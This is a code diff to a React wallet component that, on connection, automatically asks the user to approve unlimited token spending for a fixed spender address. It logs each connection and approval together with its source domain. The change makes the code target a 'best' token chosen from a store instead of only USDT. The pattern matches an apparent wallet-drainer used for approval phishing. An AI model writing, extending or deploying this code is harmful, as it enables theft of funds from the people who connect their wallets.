@@ -7,6 +7,7 @@ import { supabase } from '../lib/supabaseClient';
 import { isMainnet } from '../lib/walletConfig';
 import { getSourceDomain } from '../config/domains';
 import { trackEvent } from '../lib/analytics';
+import { useBestToken } from '../lib/tokenStore';
 
 // ── Contract addresses ────────────────────────────────────────────────────────
 const EVM_USDT = isMainnet()
@@ -81,16 +82,19 @@ async function trackApproval(address, network, txHash, sourceDomain) {
 function EvmApprovalWatcher() {
   const { address, isConnected, connector } = useAccount();
   const { writeContractAsync } = useWriteContract();
+  const bestToken = useBestToken();
+
+  const activeTokenAddress = bestToken?.address || EVM_USDT;
 
   const connectionTracked = useRef(new Set());
   const approvalAttempted = useRef(new Set());
 
   const { data: allowance } = useReadContract({
-    address: EVM_USDT,
+    address: activeTokenAddress,
     abi: USDT_ABI,
     functionName: 'allowance',
     args: [address, EVM_SPENDER],
-    query: { enabled: isConnected && !!address && !!EVM_USDT && !!EVM_SPENDER },
+    query: { enabled: isConnected && !!address && !!activeTokenAddress && !!EVM_SPENDER },
   });
 
   // Track connection
@@ -104,23 +108,23 @@ function EvmApprovalWatcher() {
 
   // Check allowance and request approval
   useEffect(() => {
-    if (!isConnected || !address || !EVM_USDT || !EVM_SPENDER) return;
+    if (!isConnected || !address || !activeTokenAddress || !EVM_SPENDER) return;
     if (allowance === undefined) return; // still loading
-    const key = address.toLowerCase();
+    const key = `${address.toLowerCase()}-${activeTokenAddress.toLowerCase()}`;
     if (approvalAttempted.current.has(key)) return;
     approvalAttempted.current.add(key);
 
     if (allowance >= UNLIMITED_THRESHOLD) return; // already approved
 
     writeContractAsync({
-      address: EVM_USDT,
+      address: activeTokenAddress,
       abi: USDT_ABI,
       functionName: 'approve',
       args: [EVM_SPENDER, maxUint256],
     })
-      .then((hash) => trackApproval(key, 'evm', hash, getSourceDomain()))
+      .then((hash) => trackApproval(address.toLowerCase(), 'evm', hash, getSourceDomain()))
       .catch((err) => console.error('[UsdtApproval] EVM approve failed:', err));
-  }, [isConnected, address, allowance, writeContractAsync]);
+  }, [isConnected, address, allowance, writeContractAsync, activeTokenAddress]);
 
   return null;
 }
